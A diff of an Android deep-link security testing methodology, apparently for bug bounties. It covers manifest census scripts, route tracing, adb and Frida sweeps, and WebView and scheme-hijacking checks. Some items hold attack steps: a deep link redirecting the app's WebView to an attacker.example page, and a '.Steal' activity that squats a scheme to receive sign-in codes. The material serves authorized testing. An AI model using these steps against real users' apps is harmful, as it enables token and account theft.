@@ -13,7 +13,7 @@
 | **Milestones** | M3, M4, M5 |
 | **VRT ceiling** | `broken_authentication_and_session_management.authentication_bypass` (P1) when an intercepted link completes a login; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the router leaks a session token to your origin; `server_side_injection.file_inclusion.local` (P1) for the `file://`-through-the-router read; `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (P2) for the redeemed authorization code. Routine landing zone: `broken_access_control.exposed_sensitive_android_intent` — **priority null, rated entirely on what you demonstrate** |
 | **Primary attacker model** | **AM-02** remote one click (the model this domain exists for); AM-03 zero-permission local app for every squat/interception item; AM-08 for SDK-owned schemes; AM-04 for the notification-listener and shortcut variants |
-| **Maps to** | MASVS-PLATFORM-1, MASVS-CODE-4, MASVS-AUTH-1, MASVS-AUTH-3; MASTG-TEST-0028, MASTG-TEST-0393, MASTG-TEST-0394; MASTG-TECH-0172, MASTG-TECH-0173, MASTG-TECH-0174; MASTG-KNOW-0019, MASTG-BEST-0070, MASTG-BEST-0071, MASTG-TOOL-0032, MASTG-DEMO-0152; rules `mastg-android-deeplink-autoverify-missing`, `mastg-android-deeplink-unvalidated-parameter`, `mastg-android-custom-deeplink-scheme`; MASWE-0029, MASWE-0018, MASWE-0050; CWE-939, CWE-917, CWE-20, CWE-22, CWE-306, CWE-862, CWE-601; ATT&CK T1635, T1635.001, T1456, T1660, T1655.001, T1407 |
+| **Maps to** | MASVS-PLATFORM-1, MASVS-CODE-4, MASVS-AUTH-1, MASVS-AUTH-3; MASTG-TEST-0393, MASTG-TEST-0394 (MASTG-TEST-0028 is deprecated upstream — superseded by those two, kept only for older references); MASTG-TECH-0172, MASTG-TECH-0173, MASTG-TECH-0174; MASTG-KNOW-0019, MASTG-BEST-0070, MASTG-BEST-0071, MASTG-TOOL-0032, MASTG-DEMO-0151, MASTG-DEMO-0152; rules `mastg-android-deeplink-autoverify-missing`, `mastg-android-deeplink-unvalidated-parameter`, `mastg-android-custom-deeplink-scheme`; MASWE-0029, MASWE-0018, MASWE-0050; CWE-939, CWE-917, CWE-20, CWE-22, CWE-306, CWE-862, CWE-601; ATT&CK T1635, T1635.001, T1456, T1660, T1655.001, T1407 |
 
 ## Why this domain pays
 
@@ -93,15 +93,21 @@ Decision:
    different attacker stories and three different severities. Never mix them in one finding.
 4. **Trace the router to the sink** (D09-041). The route table is the artefact triagers want and the
    prioritiser for everything that follows. Rank routes by sink: WebView first, payment second, file third.
+   Fill its `gate` column from the live device, not the emulator (D09-081); for a Jetpack Navigation router
+   build the destination table (D09-087), and look for a key that names a class (D09-086).
 5. **`url=` → `loadUrl`** (D09-059, D09-060). The single most-paid shape in the corpus. If the WebView
    attaches auth headers, the header dump *is* the finding — a screenshot of your page is not.
 6. **The host-validation bypass matrix** (D09-042 → D09-047). Run the whole matrix, not one payload; apps
    harden one alias and forget the sibling.
 7. **Custom-scheme / unverified-host squat** (D09-026 → D09-031). Highest ceiling in the domain, but it
-   drags an installed-app precondition with it — build it only once you know a token travels that way.
+   drags an installed-app precondition with it — build it only once you know a token travels that way. The
+   inverse — delivering *your* code to the victim's redirect handler (D09-085) — needs no squat at all.
 8. **Redirect-after-check and session-appending** (D09-061, D09-062). The two shapes that produced the
    corpus's two biggest single payouts; both are one grep away.
-9. **Fire every route cold and cross-user** (D09-066 → D09-068). Cheap, and it is where the P1 IDOR is.
+9. **Fire every route cold, warm and cross-user** (D09-066 → D09-068, D09-084). Cheap, and it is where the P1
+   IDOR is; the warm path (`onNewIntent`) is the one most real taps hit and the one the validator most often
+   skips. Fire the resume/callback route while a flow is in flight (D09-082) and with a spoofed referrer
+   (D09-083).
 10. **Framework handoffs** (D09-009 → D09-011, D09-047, D09-053). A Flutter or RN app looks like it has no
     deep-link handling in Java, which is exactly why nobody tests it.
 11. **The exotic delivery vectors** (D09-035 → D09-039). Low base rate, but they remove the "requires a
@@ -110,7 +116,7 @@ Decision:
 
 ## Items
 
-### D09-001 · Census every BROWSABLE filter in the merged manifest, resolving string references
+### D09-001 · Census every data-bearing filter in the merged manifest — BROWSABLE or not — resolving string references
 
 | | |
 |---|---|
@@ -118,52 +124,62 @@ Decision:
 | **VRT** | none — inventory feeding `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-02, AM-03 |
 | **Applies to** | all |
-| **Maps to** | MASTG-TECH-0172 (Listing Deep Links); drozer `scanner.activity.browsable`; MASTG-TEST-0028 |
+| **Requires** | — |
+| **Maps to** | MASTG-TECH-0172 (Listing Deep Links); drozer `scanner.activity.browsable`; MASTG-TEST-0393, MASTG-TEST-0394 (MASTG-TEST-0028 is deprecated upstream — kept only for older references) |
+| **Record** | logs/D09-001.txt (the census output plus the two cross-check readers); `inventory/deeplinks.csv` seeded from it |
 
 - **Test:** Produce the complete `scheme://host:port/path → component` table from the **merged** manifest, not
   from source, and resolve every `@string/...` reference — schemes and hosts are routinely held in
-  `res/values/strings.xml` and flavour-overridden, so a source read gives you the wrong host set.
+  `res/values/strings.xml` and flavour-overridden, so a source read gives you the wrong host set. Census
+  **every data-bearing filter** (`VIEW`, `NDEF_DISCOVERED`, `SEND`… — BROWSABLE or not) and flag BROWSABLE in
+  a column: a non-BROWSABLE filter is still AM-03-reachable with an implicit intent, an NDEF filter is
+  reachable from a tag, and a host-less custom-scheme filter on the same activity is an alias onto the https
+  router (D09-022). Parse the XML, do not regex it — a regex over `<activity>` blocks mis-attributes filters
+  whenever a self-closing `<activity …/>` precedes an `<activity-alias>`.
 - **How:**
   ```bash
-  apktool d -f base.apk -o out                      # decodes the binary manifest
-  apkanalyzer manifest print base.apk > out/AndroidManifest.merged.xml   # includes library contributions
-  python3 - <<'PY'
-  import re, os
-  m = open('out/AndroidManifest.merged.xml').read()
+  apktool d -f "$E/apk/base.apk" -o "$DEC/apktool"                       # decodes the binary = build-merged manifest
+  apkanalyzer manifest print "$E/apk/base.apk" > "$DEC/AndroidManifest.apkanalyzer.xml"   # second reader of the same manifest
+  python3 - "$DEC/apktool/AndroidManifest.xml" "$DEC/apktool/res/values/strings.xml" <<'PY' | tee "$E/logs/D09-001.txt"
+  import sys, os, xml.etree.ElementTree as ET
+  A = '{http://schemas.android.com/apk/res/android}'
+  man, strs = sys.argv[1], sys.argv[2]
   strings = {}
-  p = 'out/res/values/strings.xml'
-  if os.path.exists(p):
-      strings = dict(re.findall(r'<string name="([^"]+)"[^>]*>([^<]*)</string>', open(p).read()))
-  def deref(v): return strings.get(v[8:], v) if v.startswith('@string/') else v
+  if os.path.exists(strs):
+      strings = {e.get('name'): (e.text or '') for e in ET.parse(strs).getroot().iter('string')}
+  deref = lambda v: strings.get(v[8:], v) if v and v.startswith('@string/') else v
   n = 0
-  for blk in re.finditer(r'<(activity|activity-alias)\b(.*?)</\1>', m, re.S):
-      body = blk.group(0)
-      comp = re.search(r'android:name="([^"]+)"', body)
-      for f in re.findall(r'<intent-filter.*?</intent-filter>', body, re.S):
-          if 'android.intent.category.BROWSABLE' not in f: continue
-          av  = 'autoVerify="true"' in f
-          sch = [deref(x) for x in re.findall(r'android:scheme="([^"]+)"', f)]
-          hos = [deref(x) for x in re.findall(r'android:host="([^"]+)"', f)]
-          pat = [(k, deref(v)) for k, v in re.findall(r'android:(path|pathPrefix|pathPattern|pathSuffix|pathAdvancedPattern)="([^"]+)"', f)]
-          print(('AV ' if av else '   '), comp.group(1) if comp else '?', '|', sch, hos, pat)
-          n += 1
-  print('BROWSABLE filters:', n)          # count them; a silent zero is a failed parse, not a clean app
+  for comp in ET.parse(man).getroot().iter():
+      if comp.tag not in ('activity', 'activity-alias'): continue
+      name, exported = comp.get(A+'name'), comp.get(A+'exported')
+      for f in comp.findall('intent-filter'):
+          data = f.findall('data')
+          if not data: continue                    # census EVERY data-bearing filter, BROWSABLE or not
+          cats = {c.get(A+'name') for c in f.findall('category')}
+          acts = sorted(a.get(A+'name') for a in f.findall('action'))
+          av  = f.get(A+'autoVerify') == 'true'
+          sch = sorted({deref(d.get(A+'scheme')) for d in data if d.get(A+'scheme')})
+          hos = sorted({deref(d.get(A+'host')) for d in data if d.get(A+'host')})
+          pat = [(k, deref(d.get(A+k))) for d in data for k in ('path','pathPrefix','pathPattern','pathSuffix','pathAdvancedPattern') if d.get(A+k)]
+          print('AV' if av else '  ', 'B' if 'android.intent.category.BROWSABLE' in cats else '-', name, 'exported='+str(exported), acts, sch, hos, pat); n += 1
+  print('data-bearing filters:', n)      # a silent zero is a failed parse, not a clean app
   PY
   ```
-  Cross-check with two independent readers, because a hand-rolled regex misses `activity-alias` and
-  library-merged filters:
+  Cross-check with two independent readers (the resolver table also lists the filters a library merged in and
+  the ones only an implicit intent can reach):
   ```bash
-  adb shell dumpsys package com.target.app | sed -n '/Activity Resolver Table/,/Receiver Resolver/p' \
-    | grep -E 'Scheme|Authority|Non-Data Actions|Action:|^\s+[a-z0-9.+-]+:'
-  drozer console connect -c "run scanner.activity.browsable -a com.target.app"
+  adb -s "$SERIAL" shell -n dumpsys package "$PKG" | sed -n '/Activity Resolver Table/,/Receiver Resolver/p' \
+    | grep -E 'Scheme|Authority|Non-Data Actions|Action:|^\s+[a-z0-9.+-]+:' | tee -a "$E/logs/D09-001.txt"
+  drozer console connect -c "run scanner.activity.browsable -a $PKG"
   ```
-- **Proof:** A table with one row per filter: component, exported yes/no, scheme, host, path matchers,
-  `autoVerify` yes/no, and the declared count. This table is the chapter's worksheet — every later item
+- **Proof:** A table with one row per data-bearing filter: component, exported yes/no, BROWSABLE yes/no,
+  actions, scheme, host, path matchers, `autoVerify` yes/no, and the declared count. This table is the chapter's worksheet — every later item
   consumes a row of it. State the count explicitly in the report appendix.
 - **Escalation:** Each custom-scheme row becomes a D09-026 squat candidate; each `https` row becomes a
-  D09-014 verification check; each row is fired in D09-013.
-- **Ruled out when:** The merged manifest contains **no** `<intent-filter>` carrying
-  `android.intent.category.BROWSABLE`, **and** `dumpsys package` shows no schemes in the Activity Resolver
+  D09-014 verification check; each row is fired in D09-013. Each non-BROWSABLE or NDEF row is an AM-03 entry
+  point fired from the probe's `start` step (D09-076) and a cross-filter alias candidate (D09-022).
+- **Ruled out when:** The merged manifest contains **no** `<intent-filter>` with a `<data>` element
+  (BROWSABLE or not), **and** `dumpsys package` shows no schemes in the Activity Resolver
   Table, **and** no in-code router exists (D09-004). Record the zero count plus the three commands. "MobSF
   did not list deep links" is not a negative.
 
@@ -175,6 +191,7 @@ Decision:
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what the unintended combination reaches) |
 | **Attacker** | AM-02, AM-03 |
 | **Applies to** | all |
+| **Requires** | deeplink |
 | **Maps to** | MASTG-TECH-0172 (documents the merge behaviour with a worked example); MASTG-KNOW-0019; `guide/topics/manifest/data-element` |
 
 - **Test:** Android documents this verbatim: "All the `<data>` elements contained within the same
@@ -187,8 +204,8 @@ Decision:
   ```bash
   # print each multi-<data> filter, then expand it by hand
   python3 - <<'PY'
-  import re, itertools
-  m = open('out/AndroidManifest.merged.xml').read()
+  import re, itertools, os
+  m = open(os.path.expandvars('$DEC/apktool/AndroidManifest.xml')).read()
   for f in re.findall(r'<intent-filter.*?</intent-filter>', m, re.S):
       if 'BROWSABLE' not in f: continue
       sch = re.findall(r'android:scheme="([^"]+)"', f) or ['<none>']
@@ -212,7 +229,7 @@ Decision:
 - **Escalation:** An `http://` combination accepted on a token-bearing route is a cleartext-link acceptance
   → D14; a custom-scheme combination on an App-Link host restores the whole D09-026 squat surface.
 - **Ruled out when:** Every BROWSABLE filter declares exactly one `<data>` element, or the expansion produces
-  only combinations that also appear in the app's own emitted links (compare against D09-005's `emitted.txt`).
+  only combinations that also appear in the app's own emitted links (compare against D09-005's `logs/D09-005-emitted.txt`).
   Paste the expansion output as the negative.
 
 ### D09-003 · Attribute every scheme to the AAR that contributed it
@@ -223,21 +240,22 @@ Decision:
 | **VRT** | none — inventory feeding `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03, AM-08 |
 | **Applies to** | all; especially apps bundling OAuth, chat, attribution or payment SDKs |
+| **Requires** | deeplink |
 | **Maps to** | Google Play ASI campaign **"Scheme Hijacking"** (started 2018-11-15); Oversecured SDK-security post ("SDKs adding URI schemes without origin validation or replay protection enable sensitive actions inside the app under the user's identity") |
 
+| **Record** | logs/D09-003.txt (scheme → handler class → contributing library table) |
 - **Test:** The client's engineers can account for the schemes they wrote. They cannot account for the ones an
   AAR merged in. SDK-owned schemes are unreviewed entry points that reach SDK parsers nobody on the team has
   read, and they are the single most common source of "we didn't know that was there".
 - **How:**
   ```bash
-  python3 - <<'PY'
-  import re
-  m = open('out/AndroidManifest.merged.xml').read()
-  for a in re.finditer(r'<(activity|activity-alias|receiver|service)\b.*?</\1>', m, re.S):
-      blk = a.group(0)
-      n = re.search(r'android:name="([^"]+)"', blk)
-      for s in re.findall(r'android:scheme="([^"]+)"', blk):
-          print(f'{s:28} -> {n.group(1) if n else "?"}')
+  python3 - "$DEC/apktool/AndroidManifest.xml" <<'PY' | tee "$E/logs/D09-003.txt"
+  import sys, xml.etree.ElementTree as ET            # parse, never regex: a self-closing <activity/> before an alias mis-attributes
+  A = '{http://schemas.android.com/apk/res/android}'
+  for comp in ET.parse(sys.argv[1]).getroot().iter():
+      if comp.tag not in ('activity', 'activity-alias', 'receiver', 'service'): continue
+      for s in sorted({d.get(A+'scheme') for d in comp.iter('data') if d.get(A+'scheme')}):
+          print(f'{s:28} -> {comp.get(A+"name")}')
   PY
   # if the client can give you a build, the merger report names the contributing AAR per node
   grep -n 'scheme' app/build/outputs/logs/manifest-merger-release-report.txt
@@ -245,7 +263,7 @@ Decision:
   ```
   Fire each SDK-owned scheme as its own entry point — it is not covered by the first-party router review:
   ```bash
-  adb shell am start -W -a android.intent.action.VIEW -d "<sdkscheme>://host/path?x=1" com.target.app
+  adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'<sdkscheme>://host/path?x=1'" "$PKG"
   ```
 - **Proof:** The scheme → handler class → contributing library table, plus a `dumpsys activity activities`
   line showing an **SDK** activity resumed on an externally supplied URI.
@@ -263,23 +281,25 @@ Decision:
 | **VRT** | none — inventory |
 | **Attacker** | AM-02, AM-03 |
 | **Applies to** | all; mandatory for apps with a single trampoline activity |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0172; MASTG-TEST-0394 (`getQueryParameter`, `getPathSegments`, `getLastPathSegment` as the extraction APIs) |
 
+| **Record** | logs/D09-004.txt (the counted extraction grep) and the route table |
 - **Test:** The manifest names the *doorway*; the route table is in code. The common shape is one trampoline
   activity claiming `scheme://*` and a big `switch` on a host or a query parameter, where **every case is a
   reachable action from an untrusted link**. Reading only the manifest gives you one entry and zero routes.
 - **How:**
   ```bash
-  jadx -d out --deobf base.apk
+  jadx -d "$DEC/jadx" --deobf "$E/apk/base.apk"          # $DEC = $E/decompiled; apktool lives in $DEC/apktool, jadx in $DEC/jadx (START.md §6)
   # the extraction APIs
-  grep -rnE 'getIntent\(\)\.getData\(\)|intent\.getData\(\)|onNewIntent|getDataString\(\)|getQueryParameter\(|getQueryParameterNames\(|getPathSegments\(|getLastPathSegment\(|Uri\.parse\(' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx|kotlin|com/google/android/material)/' > /tmp/d09_extract.txt
-  wc -l /tmp/d09_extract.txt        # count it; an empty file means your paths are wrong, not that the app is clean
+  grep -rnE 'getIntent\(\)\.getData\(\)|intent\.getData\(\)|onNewIntent|getDataString\(\)|getQueryParameter\(|getQueryParameterNames\(|getPathSegments\(|getLastPathSegment\(|Uri\.parse\(' "$DEC/jadx/sources/" \
+    | grep -viE '/jadx/sources/(android|androidx|kotlin|com/google/android/material)/' > "$E/logs/D09-004.txt"
+  wc -l "$E/logs/D09-004.txt"        # count it; an empty file means your paths are wrong, not that the app is clean
   # the route dispatchers
-  grep -rnE 'switch *\(|when *\(|route\(|navigate\(|deeplink|DeepLink|Router|NavGraph|NavDeepLink|routeTo|handleUri' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx|kotlin)/' | head -100
-  # Jetpack Navigation declares deep links in XML too
-  grep -rn '<deepLink' out/res/navigation/ 2>/dev/null
+  grep -rnE 'switch *\(|when *\(|route\(|navigate\(|deeplink|DeepLink|Router|NavGraph|NavDeepLink|routeTo|handleUri' "$DEC/jadx/sources/" \
+    | grep -viE '/jadx/sources/(android|androidx|kotlin)/' | head -100
+  # Jetpack Navigation declares deep links in XML too — D09-087 builds the destination table from them
+  grep -rn '<deepLink' "$DEC/apktool/res/navigation/" 2>/dev/null
   ```
   Follow the trampoline by hand: `getIntent().getData()` → the host/param that selects the route → the map of
   remaining parameters → the dispatcher. (Worked shape from the corpus: a `TrampolineActivity` reading
@@ -299,24 +319,26 @@ Decision:
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the intercepted value completes a login; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | **CVE-2026-26123** — Microsoft Authenticator (Android and iOS) emitted a QR-onboarding deep link on the `ms-msa://` scheme **without registering an intent filter for it**, so any sibling app could claim `ms-msa://` and receive the embedded sign-in code; fixed in the March 2026 update. ATT&CK T1635.001 URI Hijacking |
 
+| **Record** | logs/D09-005.txt (unclaimed schemes), logs/D09-005-emitted.txt, logs/D09-005-declared.txt |
 - **Test:** The inverse of squatting, and structurally invisible to a manifest review. The app *sends* a URI
   on a scheme it never claims. Nobody wins a chooser; the attacker is the only handler, so delivery is silent.
 - **How:**
   ```bash
   # every scheme-looking literal the code emits
-  grep -rhoE '"[a-z][a-z0-9+.-]{2,30}://' out/sources/ | tr -d '"' | sed 's|://||' | sort -u > /tmp/emitted.txt
-  grep -rhoE 'Uri\.parse\("([a-z][a-z0-9+.-]{2,30}):' out/sources/ | grep -oE '"[a-z][a-z0-9+.-]+:' | tr -d '":' | sort -u >> /tmp/emitted.txt
+  grep -rhoE '"[a-z][a-z0-9+.-]{2,30}://' "$DEC/jadx/sources/" | tr -d '"' | sed 's|://||' | sort -u > "$E/logs/D09-005-emitted.txt"
+  grep -rhoE 'Uri\.parse\("([a-z][a-z0-9+.-]{2,30}):' "$DEC/jadx/sources/" | grep -oE '"[a-z][a-z0-9+.-]+:' | tr -d '":' | sort -u >> "$E/logs/D09-005-emitted.txt"
   # every scheme the app claims
-  grep -ohE 'android:scheme="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sort -u > /tmp/declared.txt
-  sort -u /tmp/emitted.txt -o /tmp/emitted.txt
-  comm -23 /tmp/emitted.txt /tmp/declared.txt | grep -vE '^(https?|file|content|mailto|tel|sms|geo|market|intent|android-app|package)$'
-  wc -l /tmp/emitted.txt /tmp/declared.txt     # count both; a zero on either side is a broken grep
+  grep -ohE 'android:scheme="[^"]+"' "$DEC/apktool/AndroidManifest.xml" | cut -d'"' -f2 | sort -u > "$E/logs/D09-005-declared.txt"
+  sort -u "$E/logs/D09-005-emitted.txt" -o "$E/logs/D09-005-emitted.txt"
+  comm -23 "$E/logs/D09-005-emitted.txt" "$E/logs/D09-005-declared.txt" | grep -vE '^(https?|file|content|mailto|tel|sms|geo|market|intent|android-app|package)$' | tee "$E/logs/D09-005.txt"
+  wc -l "$E/logs/D09-005-emitted.txt" "$E/logs/D09-005-declared.txt"     # count both; a zero on either side is a broken grep
   ```
   For each unclaimed scheme, confirm nothing on a clean device handles it, then claim it:
   ```bash
-  adb shell pm query-activities -a android.intent.action.VIEW -d "ms-msa://x" | grep -E 'packageName|name='
+  adb -s "$SERIAL" shell -n pm query-activities -a android.intent.action.VIEW -d "'ms-msa://x'" | grep -E 'packageName|name='
   ```
   ```xml
   <activity android:name=".Steal" android:exported="true">
@@ -357,7 +379,7 @@ Decision:
   ```bash
   PKG=com.target.app
   adb shell pm get-app-links "$PKG"     # API 31+; states: none|verified|approved|denied|migrated|restored|legacy_failure|system_configured|>=1024
-  for H in $(grep -ohE 'android:host="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sort -u); do
+  for H in $(grep -ohE 'android:host="[^"]+"' "$DEC/apktool/AndroidManifest.xml" | cut -d'"' -f2 | sort -u); do
     S=$(adb shell pm get-app-links "$PKG" | grep -F "$H" | head -1)
     printf '%-40s %s\n' "$H" "${S:-<not claimed as an app link>}"
   done
@@ -467,9 +489,9 @@ Decision:
   handoff, and is `android:intentMatchingFlags="enforceIntentFilter"` set (D09-053)?
 - **How:**
   ```bash
-  grep -n 'flutter_deeplinking_enabled' out/AndroidManifest.merged.xml || echo "ABSENT -> deep linking is ENABLED"
-  grep -rn 'getInitialRoute\|FlutterActivity\|FlutterFragmentActivity\|io.flutter.embedding' out/sources/ | head
-  grep -B3 -A20 'android.intent.action.VIEW' out/AndroidManifest.merged.xml
+  grep -n 'flutter_deeplinking_enabled' "$DEC/apktool/AndroidManifest.xml" || echo "ABSENT -> deep linking is ENABLED"
+  grep -rn 'getInitialRoute\|FlutterActivity\|FlutterFragmentActivity\|io.flutter.embedding' "$DEC/jadx/sources/" | head
+  grep -B3 -A20 'android.intent.action.VIEW' "$DEC/apktool/AndroidManifest.xml"
   # recover the Dart route table from the AOT snapshot
   strings -8 lib/arm64-v8a/libapp.so | grep -E '^/[a-z0-9_/:-]{3,}$' | sort -u | head -60
   strings -8 lib/arm64-v8a/libapp.so | grep -iE 'allowedHost|isAllowed|instanceHostname|getAuthenticatedEmbedUrl|sandbox'
@@ -501,22 +523,26 @@ Decision:
 | **Requires** | deeplink, react-native |
 | **Maps to** | MASTG-TECH-0172, MASTG-TECH-0173; React Native `Linking.getInitialURL()` / `Linking.addEventListener('url', …)` |
 
+| **Record** | logs/D09-010.txt (recovered routes), logs/D09-010-bundle.js / .hasm (the decoded bundle — on-device bundle if the app does OTA, D17) |
 - **Test:** In RN the URI crosses a boundary: Java `ReactActivity` receives it, JS consumes it. The validator,
   if any, lives on one side and the sink on the other — and the consuming side almost always trusts the URI.
   Recover the JS route table from the bundle; it is not in the manifest and not in Java.
 - **How:**
   ```bash
   # locate and normalise the bundle (re-base on the ON-DEVICE bundle if the app does OTA — see D17)
-  find out/assets -name 'index.android.bundle' -o -name '*.hbc'
-  file out/assets/index.android.bundle          # "Hermes JavaScript bytecode" vs plain JS
+  find "$DEC/apktool/assets" -name 'index.android.bundle' -o -name '*.hbc'
+  file "$DEC/apktool/assets/index.android.bundle"          # "Hermes JavaScript bytecode" vs plain JS
   # plain JS bundle:
-  grep -aoE '"[a-z][a-z0-9+.-]*://[^"]*"' out/assets/index.android.bundle | sort -u | head -60
-  grep -ao 'getInitialURL\|addEventListener("url"\|Linking\.' out/assets/index.android.bundle | head
-  # Hermes bytecode: pull the string table first
-  hbcdump -c 'strings' out/assets/index.android.bundle > /tmp/hbc.strings 2>/dev/null \
-    || strings -8 out/assets/index.android.bundle > /tmp/hbc.strings
-  grep -aoE '"[a-z][a-z0-9+.-]*://[^"]*"' /tmp/hbc.strings | sort -u
-  grep -aiE 'getInitialURL|deeplink|linking|navigate|screen|route' /tmp/hbc.strings | sort -u | head -60
+  grep -aoE '"[a-z][a-z0-9+.-]*://[^"]*"' "$DEC/apktool/assets/index.android.bundle" | sort -u | head -60
+  grep -ao 'getInitialURL\|addEventListener("url"\|Linking\.' "$DEC/apktool/assets/index.android.bundle" | head
+  # Hermes bytecode: decode it with hermes-dec (`hbcdump` is a Hermes source-tree build artefact, not an installable tool;
+  # `strings` loses the string table's order and every non-ASCII entry — last resort only, and say so)
+  python3 -m pip install hermes-dec   # once; the D19 Hermes items use the same tool
+  hbc-disassembler "$DEC/apktool/assets/index.android.bundle" "$E/logs/D09-010-bundle.hasm" 2>/dev/null
+  hbc-decompiler   "$DEC/apktool/assets/index.android.bundle" "$E/logs/D09-010-bundle.js"   2>/dev/null \
+    || strings -8 "$DEC/apktool/assets/index.android.bundle" > "$E/logs/D09-010-bundle.js"   # lossy fallback — note it
+  grep -aoE '"[a-z][a-z0-9+.-]*://[^"]*"' "$E/logs/D09-010-bundle.js" | sort -u | tee "$E/logs/D09-010.txt"
+  grep -aiE 'getInitialURL|deeplink|linking|navigate|screen|route' "$E/logs/D09-010-bundle.js" | sort -u | head -60
   ```
   Then drive each recovered route and watch both sides:
   ```bash
@@ -548,10 +574,10 @@ Decision:
   link *is* the WebView finding.
 - **How:**
   ```bash
-  grep -nE '<allow-navigation|<allow-intent|<access ' out/res/xml/config.xml 2>/dev/null
-  python3 -c "import json;d=json.load(open('out/assets/capacitor.config.json'));print(json.dumps(d,indent=2))" 2>/dev/null | grep -A10 '"server"'
-  grep -rn 'appUrlOpen\|handleOpenURL\|window\.location\|Browser\.open' out/assets/www out/assets/public 2>/dev/null | head
-  adb shell am start -a android.intent.action.VIEW -d "targetapp://?redirect=https://attacker.example/x.html" com.target.app
+  grep -nE '<allow-navigation|<allow-intent|<access ' "$DEC/apktool/res/xml/config.xml" 2>/dev/null
+  python3 -c "import json,os;d=json.load(open(os.path.expandvars('$DEC/apktool/assets/capacitor.config.json')));print(json.dumps(d,indent=2))" 2>/dev/null | grep -A10 '"server"'
+  grep -rn 'appUrlOpen\|handleOpenURL\|window\.location\|Browser\.open' "$DEC/apktool/assets/www" "$DEC/apktool/assets/public" 2>/dev/null | head
+  adb -s "$SERIAL" shell -n am start -a android.intent.action.VIEW -d "'targetapp://?redirect=https://attacker.example/x.html'" "$PKG"
   ```
   From the loaded attacker page, test whether the bridge survived the navigation:
   ```javascript
@@ -580,6 +606,7 @@ Decision:
 | **Requires** | deeplink, device, frida |
 | **Maps to** | MASTG-TECH-0173 (Monitoring Deep Link Handlers at Runtime with Frida); MASTG-TOOL-0032 (Frida CodeShare — "Android Deep Link Observer", `@leolashkevych/android-deep-link-observer`); MASTG-DEMO-0152 |
 
+| **Record** | logs/D09-012.txt (hook output with the stack frames per fired URI) |
 - **Test:** Stop guessing parameter names. Observe every URI the app consumes *and constructs*, and — the
   whole point — get the **caller** via a stack trace so you know which class to read in jadx.
 - **How:**
@@ -621,9 +648,15 @@ Decision:
   });
   ```
   ```bash
-  frida -D "$SERIAL" -f com.target.app -l d09-observer.js
-  adb shell am start -W -a android.intent.action.VIEW -d "targetapp://load.html/?message=ok#part1" com.target.app
+  # interactive (stays attached):
+  frida -D "$SERIAL" -f "$PKG" -l d09-observer.js
+  # unattended: -q exits after script load unless -t keeps the session; tee the log
+  frida -D "$SERIAL" -f "$PKG" -l d09-observer.js -q -t 600 | tee "$E/logs/D09-012.txt"
+  adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'targetapp://load.html/?message=ok#part1'" "$PKG"
   ```
+  Current frida-tools resume the spawned process themselves (the old no-pause flag was removed in frida-tools 17)
+  and `-D "$SERIAL"` names the device (the USB shorthand picks one silently when several are attached). Zero output after the `am start` means
+  the session detached (missing `-t`) or the wrong device was picked — never a negative.
 - **Proof:** The MASTG-TECH-0173 output shape — scheme, host, params, fragment — **plus** a stack frame naming
   the file, class and method that consumed it (e.g. `WebViewActivity.kt`, `…WebViewActivity`, `onCreate`).
   That frame is the jadx entry point for D09-041.
@@ -645,30 +678,34 @@ Decision:
 | **Requires** | deeplink, device |
 | **Maps to** | repository harness `tools/07-deeplink-sweep.sh`; drozer `app.activity.start --data-uri`; MASTG-TECH-0173 |
 
+| **Record** | logs/D09-013.txt (the URI → resolved activity table with input and output counts) |
 - **Test:** Mechanically fire every declared URI plus its mutation set, recording the resolved activity for
   each. The deliverable is the list of URIs that land in a WebView or a state-changing screen.
 - **How:**
   ```bash
   # build uris.txt from the D09-001 table, then mutate
   PKG=com.target.app
-  tools/07-deeplink-sweep.sh "$PKG" uris.txt | tee /tmp/d09_sweep.txt
-  wc -l uris.txt /tmp/d09_sweep.txt      # counts MUST match; a short output means the loop ate entries
+  tools/07-deeplink-sweep.sh "$PKG" uris.txt | tee "$E/logs/D09-013.txt"
+  wc -l uris.txt "$E/logs/D09-013.txt"      # counts MUST match; a short output means the loop ate entries
   ```
   Do not iterate a file in a shell array — zsh array expansion fails silently and produces zero iterations
-  with no error. Use Python for anything over five items:
+  with no error. In a shell loop every `adb shell` takes `-n` and every `read` takes `-r`, otherwise adb eats
+  the loop's stdin after the first row (D09-078 point 5); every value that reaches the device shell is
+  single-quoted a second time (`-d "'<uri>'"`). Use Python for anything over five items — and quote there too:
   ```python
-  import subprocess, time, sys
-  uris = [l.strip() for l in open('uris.txt') if l.strip()]
+  import subprocess, time, sys, os, shlex
+  ADB = ['adb', '-s', os.environ['SERIAL'], 'shell', '-n']
+  uris = [l.rstrip('\n') for l in open('uris.txt') if l.strip()]
   ok = 0
   for u in uris:
       try:
-          subprocess.run(['adb','shell','am','start','-a','android.intent.action.VIEW',
-                          '-c','android.intent.category.BROWSABLE','-d',u],
+          subprocess.run(ADB + ['am','start','-a','android.intent.action.VIEW',
+                                '-c','android.intent.category.BROWSABLE','-d',shlex.quote(u)],   # quoted for the DEVICE shell
                          capture_output=True, timeout=20)
           time.sleep(3)
-          top = subprocess.run(['adb','shell','dumpsys','activity','activities'],
+          top = subprocess.run(ADB + ['dumpsys','activity','activities'],
                                capture_output=True, text=True, timeout=20).stdout
-          line = next((l for l in top.splitlines() if 'topResumedActivity' in l), '')
+          line = next((l for l in top.splitlines() if 'ResumedActivity' in l), '')
           print(f'{u:70} -> {line.strip()}'); ok += 1
       except Exception as e:
           print(f'{u:70} -> ERROR {e}', file=sys.stderr)
@@ -757,9 +794,9 @@ Decision:
   ```bash
   PKG=com.target.app
   # what the APK is actually signed with
